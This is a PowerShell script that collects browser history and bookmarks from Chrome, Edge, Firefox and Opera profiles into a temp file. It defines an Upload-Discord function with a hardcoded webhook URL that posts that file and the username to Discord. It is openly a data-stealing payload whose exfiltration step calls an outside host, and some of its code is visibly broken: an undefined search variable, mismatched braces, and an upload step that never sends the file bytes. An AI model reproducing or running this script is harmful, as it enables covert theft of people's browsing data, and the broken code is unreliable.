function Get-BrowserData {

    [CmdletBinding()]
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    switch ($Browser.ToLower()) {
        'chrome' {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
            break
        }
        'edge' {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"
            break
        }
        'firefox' {
            $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release"
            break
        }
        'opera' {
            $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable"
            break
        }
    }

    if ($DataType -eq 'history') {
        $Path = Join-Path $Path 'History'
    } elseif ($DataType -eq 'bookmarks') {
        $Path = Join-Path $Path 'Bookmarks'
    }

    if (Test-Path $Path) {
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
        $Value | ForEach-Object {
            $Key = $_
            if ($Key -match $Search) {
                New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                }
            }
        }
    }
}

$browsers = @("edge", "chrome", "firefox", "opera")
$dataTypes = @("history", "bookmarks")

foreach ($browser in $browsers) {
    foreach ($dataType in $dataTypes) {
        Get-BrowserData -Browser $browser -DataType $dataType >> $env:TMP\--BrowserData.txt
    }
}

# ... Rest of the code (Upload-Discord function and execution)

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )
    
    $hookurl = "https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
    
    $Body = @{
      'username' = $env:username
      'content' = $text
    }
    
    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }
    
    if (-not ([string]::IsNullOrEmpty($file))){
        $data = [IO.File]::ReadAllBytes($file)
        $form = new-object System.Net.Http.FormUrlEncodedContent @{content=$text}
        $client = new-object System.Net.Http.HttpClient
        $client.DefaultRequestHeaders.Add("Authorization", "Bot <bot_token>")
        $response = $client.PostAsync($hookurl, $form).Result
        $content = [Text.Encoding]::UTF8.GetString($response.Content.ReadAsByteArrayAsync().Result)
    }
    }
    
    if (-not ([string]::IsNullOrEmpty($dc))){
        Upload-Discord -file "$env:TMP/--BrowserData.txt" -text "Browser data"
    }
    
